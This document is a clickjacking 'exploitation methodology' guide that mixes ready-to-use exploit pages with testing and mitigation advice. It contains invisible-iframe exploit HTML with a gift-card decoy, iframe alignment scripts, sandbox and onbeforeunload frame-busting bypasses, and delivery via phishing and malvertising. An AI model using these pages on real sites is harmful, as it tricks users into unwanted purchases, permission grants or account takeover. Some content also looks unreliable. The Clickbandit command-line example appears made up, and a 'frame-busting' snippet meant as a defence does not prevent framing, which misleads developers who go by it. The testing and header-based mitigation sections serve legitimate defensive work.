# Complete Clickjacking Exploitation Methodology

## Table of Contents

1. Understanding Clickjacking Fundamentals
2. Complete Exploitation Methodology
3. Real-World Attack Examples (Past Years)
4. Tools and Techniques (Burp Suite & Others)
5. Testing Methodology
6. Advanced Attack Vectors
7. Mitigation and Prevention


## 1. Understanding Clickjacking Fundamentals

Clickjacking, also known as a UI redress attack, is a technique where attackers trick users into clicking something different from what they perceive . The term combines "click" and "hijacking" because the attack essentially hijacks user interactions for malicious purposes.

### How It Works - Step by Step

**Step 1: Setup** - The attacker creates an invisible iframe that embeds a targeted web page (e.g., a bank transaction page or social media account settings) .

**Step 2: Deception** - A visible UI element, like a fake play button or form, is overlaid on top of the hidden iframe to misdirect the user .

**Step 3: Click Hijack** - The user clicks the visible element, intending to perform a specific task (e.g., closing a pop-up).

**Step 4: Actual Outcome** - The click instead triggers the hidden action, such as confirming a purchase or granting permissions to the attacker .

### The Core Attack Concept

The attack works by positioning a transparent `<iframe>` from a victim website (like Facebook or Twitter) directly over a decoy button on the attacker's page. When users attempt to click what looks like a harmless button, they actually click on the invisible iframe, triggering unintended actions .

Here is a basic example showing how the attack works (with half-transparent iframe for illustration - real attacks use full transparency):

```html
<style>
  iframe {
    width: 400px;
    height: 100px;
    position: absolute;
    top: 0;
    left: -20px;
    opacity: 0.5;  /* In real attacks, this is opacity: 0 */
    z-index: 1;
  }
</style>

<div>Click to get rich now:</div>
<iframe src="https://victim-website.com/action"></iframe>
<button>Click here!</button>
```

In real attacks, the iframe is completely transparent (`opacity: 0`), so the user never sees what they are actually clicking .


## 2. Complete Exploitation Methodology

### Phase 1: Reconnaissance and Target Selection

**Objective:** Identify vulnerable endpoints that perform sensitive actions with a single click.

**Steps:**

1. **Identify sensitive actions** on the target website such as:
   - Account deletion buttons
   - Payment confirmation buttons
   - Settings change toggles
   - "Like," "Follow," or "Share" buttons
   - OAuth authorization prompts
   - Browser extension installation confirmations

2. **Check framing protections** by examining HTTP response headers:
   - Look for `X-Frame-Options` header (values: DENY, SAMEORIGIN, ALLOW-FROM)
   - Look for `Content-Security-Policy` with `frame-ancestors` directive

3. **Test if the page can be framed** by creating a simple HTML page with an iframe targeting the endpoint.

### Phase 2: Building the Exploit Page

**Basic Clickjacking Payload Structure:**

```html
<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking Exploit</title>
  <style>
    /* Make iframe completely invisible */
    iframe {
      position: absolute;
      width: 800px;
      height: 600px;
      top: -100px;
      left: -200px;
      opacity: 0;
      filter: alpha(opacity=0);
      z-index: 2;
      border: none;
    }
    
    /* Decoy button styling */
    .decoy-button {
      position: absolute;
      top: 200px;
      left: 300px;
      width: 200px;
      height: 50px;
      background: #4CAF50;
      color: white;
      text-align: center;
      line-height: 50px;
      cursor: pointer;
      z-index: 1;
      border-radius: 5px;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <div class="decoy-button">
    Click for Free Gift Card!
  </div>
  
  <iframe src="https://vulnerable-target.com/sensitive-action"></iframe>
</body>
</html>
```

### Phase 3: Precise Positioning

To ensure the click lands exactly on the target element, you need to calculate the exact position of the button within the iframe. This can be done by:

1. Loading the target page in a browser
2. Using Developer Tools to inspect the target button's position
3. Adjusting the iframe's `top` and `left` CSS properties to align the button with your decoy element

**Advanced Positioning with JavaScript:**

```html
<script>
  function positionIframe() {
    var iframe = document.getElementById('targetFrame');
    var decoy = document.getElementById('decoyButton');
    var rect = decoy.getBoundingClientRect();
    
    // Adjust these values based on the target button's position
    iframe.style.top = (rect.top - 150) + 'px';
    iframe.style.left = (rect.left - 400) + 'px';
  }
  
  window.addEventListener('resize', positionIframe);
  window.addEventListener('scroll', positionIframe);
  positionIframe();
</script>
```

### Phase 4: Delivery Methods

Once the exploit page is built, attackers deliver it to victims through various methods:

1. **Malvertising** - Disguised ads on legitimate networks
2. **Phishing emails** - Links to attacker-controlled pages
3. **Compromised legitimate sites** - Using XSS or SQL injection to inject clickjacking code
4. **Shortened URLs** - Obfuscating the destination
5. **Social media posts** - Enticing headlines leading to the exploit page


## 3. Real-World Attack Examples (Past Years)

### Twitter, Facebook, and PayPal Attacks

Many major websites have been hacked using clickjacking techniques, including Twitter, Facebook, and PayPal. All have since been fixed, but these attacks demonstrated the severity of the vulnerability .

**How the Facebook Attack Worked:**
- A visitor was lured to an evil page through any means (ads, links, etc.)
- The page displayed a harmless-looking link like "Get Rich Now" or "Click Here, Very Funny"
- Over that link, the evil page positioned a transparent iframe from facebook.com
- The Facebook "Like" button was positioned exactly above the decoy link using CSS z-index
- When users attempted to click the harmless link, they actually clicked the Facebook Like button 

### F-Secure Safe Browser (2022)

A critical clickjacking vulnerability was discovered in the F-Secure Safe Browser's address bar handler (CVE-2022-28872). The attack could be launched remotely, allowing attackers to manipulate the browser's UI and potentially trick users into unintended actions .

### Mozilla Firefox XSLT Error Clickjacking (2022)

A vulnerability was found in Mozilla Firefox up to version 103 (CVE-2022-38472). Attackers could abuse XSLT error handling to associate attacker-controlled content with another origin displayed in the address bar. This could be used to fool users into submitting data intended for a spoofed origin .

### DoubleClickjacking (2024-2025)

A new variation called "DoubleClickjacking" emerged, affecting almost every major website. This technique bypasses traditional clickjacking protections including X-Frame-Options headers and SameSite cookies .

**How DoubleClickjacking Works:**
- Attackers exploit timing differences between mousedown and onclick events
- A swift window swap occurs during a double-click sequence
- The attack redirects clicks to sensitive targets like OAuth prompts
- The user unintentionally authorizes malicious app access, often leading to immediate account takeover 

The researcher Paulos Yibelo published proof-of-concept code demonstrating this attack, showing it can lead to account takeovers on many major platforms .

### Browser Extension Clickjacking

This emerging threat involves attackers overlaying invisible UI elements over legitimate extension buttons, tricking users into granting permissions or executing malicious scripts .

**Example Attack Code:**
```javascript
document.getElementById("legit-button").style.zIndex = "-1";
document.getElementById("malicious-overlay").style.zIndex = "9999";
```


## 4. Tools and Techniques

### Burp Suite - Clickbandit

Burp Suite is one of the most effective tools for testing clickjacking vulnerabilities. Research has confirmed that Burp Clickbandit successfully identifies potential clickjacking attack vectors .

**How to Use Burp Clickbandit:**

1. **Install Burp Suite** (Community Edition works fine)
2. **Navigate to the Clickbandit tool**:
   - In Burp Suite, go to the "Engagement tools" menu
   - Select "Clickbandit" from the dropdown

3. **Using Clickbandit Step by Step:**

   **Step 1:** Open your browser and navigate to the page you want to test
   
   **Step 2:** In Burp Suite, start Clickbandit
   
   **Step 3:** Clickbandit will generate a proof-of-concept HTML page that shows if the target page can be framed
   
   **Step 4:** Interact with the generated page to see if you can trigger actions on the hidden iframe
   
   **Step 5:** Clickbandit records your interactions and shows which clicks would have reached the target

4. **Command Line Alternative:**
   ```bash
   java -jar clickbandit.jar --target-url https://example.com
   ```

### OWASP ZAP

OWASP ZAP is another excellent tool for detecting clickjacking vulnerabilities .

**How to Test Clickjacking with OWASP ZAP:**

1. **Spider the target website** to discover all pages
2. **Run the active scan** - ZAP automatically checks for missing or misconfigured framing protections
3. **Review the alerts** - Look for "Missing X-Frame-Options Header" or "Clickjacking" alerts
4. **Generate proof-of-concept** - ZAP can create HTML files demonstrating the vulnerability

### Manual Testing with Browser Developer Tools

**Step-by-Step Manual Testing:**

1. **Open Chrome DevTools** (F12) 
2. **Inspect the target button or element** to check for:
   - `z-index` manipulation possibilities
   - Hidden iframes overlaying critical elements
   
3. **Create a test HTML file**:
   ```html
   <html>
   <body>
     <iframe src="https://target-website.com/sensitive-page" 
             style="opacity:0; position:absolute; top:0; left:0;">
     </iframe>
     <button style="position:absolute; top:100px; left:100px;">
       Click Me
     </button>
   </body>
   </html>
   ```

4. **Load the test file** in your browser while logged into the target website
5. **Click the decoy button** and observe if unintended actions occur

### Automated Scanning Tools

**Vulnerability Scanners** like Nessus, Qualys, and OpenVAS can detect missing security headers. However, they may not always identify all clickjacking vectors because the vulnerability often depends on the specific UI layout .

**CSP Reporting** - Utilize Content-Security-Policy reports to flag potentially malicious iframe implementations .

### Custom Python Script for Header Checking

```python
import requests

def check_clickjacking_protection(url):
    try:
        response = requests.get(url)
        headers = response.headers
        
        x_frame = headers.get('X-Frame-Options')
        csp = headers.get('Content-Security-Policy')
        
        print(f"Testing: {url}")
        print(f"X-Frame-Options: {x_frame}")
        print(f"CSP frame-ancestors: {'present' if 'frame-ancestors' in str(csp) else 'missing'}")
        
        if not x_frame and 'frame-ancestors' not in str(csp):
            print("VULNERABLE: No framing protections detected!")
        else:
            print("Protected: Framing restrictions in place")
            
    except Exception as e:
        print(f"Error: {e}")

# Test a URL
check_clickjacking_protection("https://example.com/sensitive-page")
```


## 5. Testing Methodology

### Comprehensive Testing Approach

According to cybersecurity best practices, testing for clickjacking requires a multi-faceted approach :

**1. Web Scanning Tools**
Use automated tools like OWASP ZAP and Burp Suite to analyze iframe behaviors and detect issues.

**2. Manual Testing**
Embed your web pages in iframes manually to reveal potential vulnerabilities. This involves creating simple HTML pages that attempt to frame your application's sensitive endpoints.

**3. Suspicious DOM Behavior Monitoring**
Monitor changes to the Document Object Model (DOM) to help identify tampered elements.

**4. Automated CSP Reporting**
Utilize Content-Security-Policy reports to flag potentially malicious iframe implementations.

**5. Bug Bounty Programs**
Leverage security researchers by running responsible disclosure programs that identify UI redress flaws.

### Step-by-Step Testing Checklist

**Step 1: Identify Sensitive Endpoints**
- List all pages that perform state-changing actions
- Include account settings, payment pages, admin panels
- Include OAuth authorization endpoints
- Include any page with one-click actions

**Step 2: Check Response Headers**
```bash
curl -I https://target.com/sensitive-page
```
Look for:
- `X-Frame-Options: DENY` or `SAMEORIGIN` (good)
- `Content-Security-Policy: frame-ancestors 'none'` or `'self'` (good)
- Missing headers (potentially vulnerable)

**Step 3: Create Test Iframe**
```html
<html>
<head><title>Clickjacking Test</title></head>
<body>
<iframe src="https://target.com/sensitive-page" width="100%" height="100%"></iframe>
</body>
</html>
```

**Step 4: Test Different Contexts**
- Test while logged in to the target
- Test while logged out
- Test from different origins (local file, different domain)
- Test with different iframe attributes (sandbox, srcdoc)

**Step 5: Verify Protection Bypasses**
- Test if `X-Frame-Options: ALLOW-FROM` can be bypassed
- Test if client-side frame busting can be circumvented using the `sandbox` attribute
- Test for DoubleClickjacking vulnerabilities by checking double-click actions

### Using Burp Suite for Comprehensive Testing

**Setting up Burp for Clickjacking Testing:**

1. **Configure your browser** to use Burp as a proxy (localhost:8080)
2. **Browse the target application** to map all endpoints
3. **Use the Target > Site map** to review all discovered pages
4. **For each sensitive page**, check the response headers in the Inspector tab
5. **Use Repeater** to modify requests and test different scenarios
6. **Run Clickbandit** for visual proof-of-concept generation

**Interpreting Results:**

| Protection Header | Security Level | Notes |
|-------------------|----------------|-------|
| X-Frame-Options: DENY | Secure | Page cannot be framed at all |
| X-Frame-Options: SAMEORIGIN | Secure | Only same-origin framing allowed |
| X-Frame-Options: ALLOW-FROM domain | Partial | May be bypassed; CSP preferred |
| CSP: frame-ancestors 'none' | Secure | Modern, robust protection |
| CSP: frame-ancestors 'self' | Secure | Modern, robust protection |
| Missing headers | Vulnerable | Page can likely be framed |
| Client-side only | Vulnerable | Can be bypassed with sandbox |


## 6. Advanced Attack Vectors

### Bypassing Frame-Busting Protections

Some websites implement client-side JavaScript to prevent framing (called "frame-busting"):

```javascript
// Common frame-busting code
if (top != self) { top.location = self.location; }
```

**Bypass Technique - Sandbox Attribute:**
```html
<iframe sandbox="allow-forms allow-scripts" src="https://victim.com"></iframe>
```

The sandbox attribute without `allow-top-navigation` prevents the framed page from modifying `top.location`, effectively bypassing the frame-busting protection .

**Bypass Technique - beforeunload Event:**
```html
<script>
  window.onbeforeunload = function() { return "Are you sure?"; };
</script>
<iframe src="https://victim.com"></iframe>
```

This blocks the navigation attempt and keeps the iframe in place.

### DoubleClickjacking Attack

DoubleClickjacking is a sophisticated variation that bypasses traditional protections by exploiting double-click sequences .

**How DoubleClickjacking Works:**

**Step 1:** The attacker creates a button that opens a new window on the first click

**Step 2:** The parent window redirects to a sensitive target (like an OAuth authorization page)

**Step 3:** The user double-clicks - the second click closes the top window

**Step 4:** The unintentional click triggers authorization on the parent window, granting the attacker access 

**DoubleClickjacking Attack Flow:**
1. User clicks a seemingly harmless button on the attacker's site
2. A new window opens, prompting for a double-click
3. The parent window is redirected to an OAuth authorization page
4. The user's double-click unintentionally authorizes the malicious app
5. The attacker gains immediate account access 

### Keystroke Jacking

While clickjacking primarily affects mouse actions, keyboard input can theoretically be redirected by overlapping text fields. However, this is more difficult because users will notice when their typed characters don't appear on screen .

### Browser Extension Clickjacking

This specialized attack targets browser extensions by overlaying invisible elements on top of extension buttons. Users may unintentionally grant permissions or execute malicious scripts thinking they are interacting with the legitimate extension interface .


## 7. Mitigation and Prevention

### Server-Side Protections (Most Important)

**X-Frame-Options Header:**

The most reliable defense is server-side headers that control framing .

**Apache Configuration:**
```apache
Header always append X-Frame-Options DENY
```

**Nginx Configuration:**
```nginx
add_header X-Frame-Options "DENY" always;
```

**IIS Configuration:**
```xml
<add name="X-Frame-Options" value="DENY" />
```

**Available Values:**
- `DENY` - Never allow framing under any circumstances
- `SAMEORIGIN` - Allow framing only from the same origin
- `ALLOW-FROM domain` - Allow framing only from specific domain (less supported)

### Content Security Policy (CSP)

Modern applications should use CSP with the `frame-ancestors` directive, which supersedes X-Frame-Options .

```http
Content-Security-Policy: frame-ancestors 'none';
# Or to allow same origin only:
Content-Security-Policy: frame-ancestors 'self';
# Or to allow specific domains:
Content-Security-Policy: frame-ancestors https://trusted.example.com;
```

### Defense in Depth Strategy

1. **Combine X-Frame-Options and CSP** - Use both as they are processed by different browser components

2. **SameSite Cookies** - Set `SameSite=Strict` or `Lax` to prevent authenticated requests from cross-site contexts

3. **CSRF Tokens** - Require unpredictable tokens for state-changing requests

4. **User Interaction Confirmation** - Require additional confirmation (checkbox, CAPTCHA, or re-authentication) for sensitive actions

5. **Disable Critical Buttons by Default** - For DoubleClickjacking protection, disable critical buttons until a mouse gesture or key press is detected 

### Frame-Busting with Safe Fallback

For legacy applications that cannot implement proper headers:

```javascript
// Modern frame-busting that resists sandbox bypass
if (window.self !== window.top) {
    // Prevent DOM access from parent
    Object.defineProperty(document, 'cookie', {
        get: function() { return ''; },
        set: function() { return false; }
    });
    throw new Error('Framing detected');
}
```

### Testing Your Protections

After implementing protections, verify them by:

1. **Attempting to frame your pages** using a simple HTML iframe
2. **Using Burp Clickbandit** to generate proof-of-concept exploits
3. **Running OWASP ZAP** active scans against your application
4. **Checking response headers** with curl or browser DevTools
5. **Testing for DoubleClickjacking** by examining double-click actions on sensitive buttons

### Common Misconfigurations to Avoid

1. **Using meta tags for X-Frame-Options** - The browser ignores `X-Frame-Options` in HTML meta tags; it must be an HTTP header 

2. **Incomplete CSP directives** - Ensure `frame-ancestors` is properly formatted and not missing quotes

3. **ALLOW-FROM with unsupported browsers** - Many browsers don't properly support ALLOW-FROM; use CSP instead

4. **Relying only on client-side frame busting** - This can be bypassed using the sandbox attribute


## Conclusion

Clickjacking remains a significant web vulnerability despite being known for over a decade. The attack exploits user trust and UI design to hijack clicks for malicious purposes. Major platforms including Twitter, Facebook, and PayPal have been affected in the past .

Modern variants like DoubleClickjacking demonstrate that the threat continues to evolve, bypassing traditional protections and affecting almost every major website . Browser extension clickjacking adds another dimension to the threat landscape .

**Key Takeaways:**

- Always implement server-side framing protections (X-Frame-Options or CSP)
- Test your applications regularly using tools like Burp Clickbandit and OWASP ZAP
- Don't rely on client-side frame-busting alone - it can be bypassed
- Stay informed about new attack variants like DoubleClickjacking
- Use defense in depth with SameSite cookies, CSRF tokens, and user confirmation

**Testing Tools Summary:**
- **Burp Suite Clickbandit** - Best for visual proof-of-concept generation
- **OWASP ZAP** - Excellent for automated scanning
- **Browser DevTools** - Good for manual testing and debugging
- **Custom scripts** - Useful for batch testing multiple endpoints

The most effective protection combines proper HTTP headers, secure cookie configurations, and thoughtful UI design that requires explicit user confirmation for sensitive actions.
